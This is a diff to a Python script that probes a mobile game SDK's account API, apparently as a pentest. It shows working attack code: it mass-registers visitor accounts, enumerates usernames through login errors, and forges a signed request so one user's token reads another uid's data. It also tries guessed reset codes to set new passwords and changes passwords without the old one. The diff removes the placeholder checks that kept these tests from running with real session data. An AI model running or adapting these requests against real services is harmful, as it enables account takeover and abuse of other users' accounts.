@@ -18,16 +18,9 @@ import json
 import uuid
 import urllib3
 import requests
-from sign_helper import QuickGameSession, SERVERS, APP_KEY, md5
+from sign_helper import SESSION, SERVERS, APP_KEY_DEX as APP_KEY, md5, build_sign
 
 urllib3.disable_warnings()
-
-SESSION = QuickGameSession(
-    uid="FILL_UID",
-    username="FILL_USER",
-    token="FILL_TOKEN",
-    server=SERVERS["account_primary"],
-)
 
 
 def log(label, resp):
@@ -44,7 +37,7 @@ def log(label, resp):
 # ─── Test 1: Visitor Account Registration ────────────────────────────────────
 def test_visitor_registration():
     """
-    /v1/user/registerVisitor typically creates anonymous accounts.
+    /v1/user/registerVisitor creates anonymous accounts.
     Risk: unlimited account creation, CDKey farming, spam.
     """
     print("\n" + "="*55)
@@ -56,58 +49,44 @@ def test_visitor_registration():
     ]
 
     for device_id in device_ids:
-        # Try unauthenticated
         resp = requests.post(
-            SERVERS["account_primary"] + "/v1/user/registerVisitor",
+            SERVERS["login"] + "/v1/user/registerVisitor",
             data={
-                "appKey":   APP_KEY,
-                "os":       "android",
-                "deviceId": device_id,
-                "channel":  "GooglePlay",
+                "appKey":      APP_KEY,
+                "os":          "android",
+                "deviceId":    device_id,
+                "channelCode": "GooglePlay",
+                "clientLang":  "es",
             },
-            headers={"User-Agent": "Dalvik/2.1.0"},
+            headers={"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM S908E)"},
             verify=False, timeout=15
         )
         log(f"registerVisitor deviceId={device_id[:20]}", resp)
-
-        # Also try alt server
-        resp2 = requests.post(
-            SERVERS["account_alt"] + "/v1/user/registerVisitor",
-            data={"appKey": APP_KEY, "os": "android", "deviceId": device_id},
-            headers={"User-Agent": "Dalvik/2.1.0"},
-            verify=False, timeout=15
-        )
-        log(f"registerVisitor (alt server) deviceId={device_id[:20]}", resp2)
         time.sleep(1)
 
 
 # ─── Test 2: Account Enumeration via Login ────────────────────────────────────
 def test_account_enumeration():
     """
-    Test if login error messages differ for:
-      - Non-existent username
-      - Existing username + wrong password
+    Test if login error messages differ for nonexistent vs existing usernames.
     If they differ, usernames can be enumerated.
     """
     print("\n" + "="*55)
     print("TEST 2: Account Enumeration via Login Error Messages")
 
     test_cases = [
-        ("nonexistent_user_xyz_12345", "wrong_password"),
-        ("admin",                      "wrong_password"),
-        ("test",                       "wrong_password"),
-        ("guest",                      "wrong_password"),
-        # If CAPTURED_SESSION has a real username, test it with wrong password
-        (SESSION.username if SESSION.username != "FILL_USER" else "test_real_user",
-         "definitely_wrong_password_xyz"),
+        ("nonexistent_user_xyz_12345",  "wrong_password"),
+        ("admin",                        "wrong_password"),
+        ("guest",                        "wrong_password"),
+        (SESSION.username,               "definitely_wrong_password_xyz"),
     ]
 
     for username, password in test_cases:
         resp = requests.post(
-            SERVERS["account_primary"] + "/v1/user/login",
+            SERVERS["login"] + "/v1/user/login",
             data={"appKey": APP_KEY, "username": username, "password": password,
-                  "os": "android"},
-            headers={"User-Agent": "Dalvik/2.1.0"},
+                  "os": "android", "channelCode": "default"},
+            headers={"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM S908E)"},
             verify=False, timeout=15
         )
         try:
@@ -121,38 +100,36 @@ def test_account_enumeration():
 
 
 # ─── Test 3: Token Reuse Across UIDs ─────────────────────────────────────────
-def test_token_uid_mismatch(session: QuickGameSession):
+def test_token_uid_mismatch(session):
     """
-    Authenticated as uid=A with token=T, call getUserInfo with uid=B+token=T.
-    If the server validates token→uid binding, this should fail.
-    If not — authentication bypass: access any account with any valid token.
+    Authenticated as uid=A with authToken=T, call getUserInfo with uid=B+authToken=T.
+    If not validated — any valid token can access any account.
     """
-    if session.uid == "FILL_UID":
-        print("\n[SKIP] Token/UID mismatch test — fill SESSION first")
-        return
-
     print("\n" + "="*55)
     print("TEST 3: Token Reuse with Different UID (Auth Bypass)")
 
     own_uid = int(session.uid)
     target_uid = str(own_uid + 1)
 
-    # Recompute sign with target_uid but same token
-    from sign_helper import build_sign
-    forged_sign = build_sign(target_uid, session.username, session.token,
-                              session.os_type, session.usermode)
+    # Build forged params with different uid but same authToken
+    import time as _time
+    ts = str(int(_time.time()))
+    forged_params = {
+        "uid":         target_uid,
+        "username":    session.username,
+        "authToken":   session.authToken,
+        "channelCode": session.channel,
+        "clientLang":  session.lang,
+        "os":          session.os_type,
+        "usermode":    str(session.usermode),
+        "time":        ts,
+    }
+    forged_params["sign"] = build_sign(forged_params)
 
     resp = requests.get(
         session.server + "/v1/auth/getUserInfo",
-        params={
-            "uid":      target_uid,
-            "username": session.username,
-            "token":    session.token,
-            "sign":     forged_sign,
-            "os":       session.os_type,
-            "usermode": session.usermode,
-        },
-        headers={"User-Agent": "Dalvik/2.1.0"},
+        params=forged_params,
+        headers={"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM S908E)"},
         verify=False, timeout=15
     )
     log(f"Token reuse target_uid={target_uid} (own={own_uid})", resp)
@@ -173,11 +150,11 @@ def test_password_reset():
     ]
 
     for email in test_emails:
-        # Step 1: Request reset code
         resp = requests.post(
-            SERVERS["account_primary"] + "/v1/user/sendCodeByEmail",
-            data={"appKey": APP_KEY, "email": email, "os": "android"},
-            headers={"User-Agent": "Dalvik/2.1.0"},
+            SERVERS["login"] + "/v1/user/sendCodeByEmail",
+            data={"appKey": APP_KEY, "email": email, "os": "android",
+                  "channelCode": "default"},
+            headers={"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM S908E)"},
             verify=False, timeout=15
         )
         try:
@@ -186,20 +163,19 @@ def test_password_reset():
         except Exception:
             print(f"  sendCode email={email:<40} {resp.status_code}: {resp.text[:100]}")
 
-        # Step 2: Try to use reset with a guessed short code
         for test_code in ["000000", "123456", "111111", "999999"]:
             resp2 = requests.post(
-                SERVERS["account_primary"] + "/v1/user/findPassByEmail",
+                SERVERS["login"] + "/v1/user/findPassByEmail",
                 data={"appKey": APP_KEY, "email": email, "code": test_code,
                       "newPwd": "PentestNewPwd123!", "os": "android"},
-                headers={"User-Agent": "Dalvik/2.1.0"},
+                headers={"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM S908E)"},
                 verify=False, timeout=15
             )
             try:
                 data2 = resp2.json()
                 code = data2.get("code")
                 msg  = data2.get("msg", "")
-                print(f"    findPassByEmail code={test_code}: code={code} msg={repr(msg)}")
+                print(f"    findPassByEmail resetCode={test_code}: code={code} msg={repr(msg)}")
                 if code == 0:
                     print(f"    [!!!] PASSWORD RESET SUCCESSFUL with code {test_code}!")
                     break
@@ -211,14 +187,11 @@ def test_password_reset():
 
 
 # ─── Test 5: changePassword Without Old Password ─────────────────────────────
-def test_change_password_no_old(session: QuickGameSession):
+def test_change_password_no_old(session):
     """
     Some SDKs allow password change without providing the old password.
     /v1/auth/changePassword — test if oldPassword is validated server-side.
     """
-    if session.uid == "FILL_UID":
-        print("\n[SKIP] changePassword test — fill SESSION first")
-        return
 
     print("\n" + "="*55)
     print("TEST 5: changePassword Without Old Password")
@@ -236,14 +209,11 @@ def test_change_password_no_old(session: QuickGameSession):
 
 
 # ─── Test 6: Account Deletion ─────────────────────────────────────────────────
-def test_account_deletion_probe(session: QuickGameSession):
+def test_account_deletion_probe(session):
     """
     /v1/auth/cUserTrash — probe (don't actually delete!).
     Check if it requires additional confirmation or is one-step.
     """
-    if session.uid == "FILL_UID":
-        print("\n[SKIP] cUserTrash probe — fill SESSION first")
-        return
 
     print("\n" + "="*55)
     print("TEST 6: Account Deletion Probe (DRY RUN — no confirm param)")
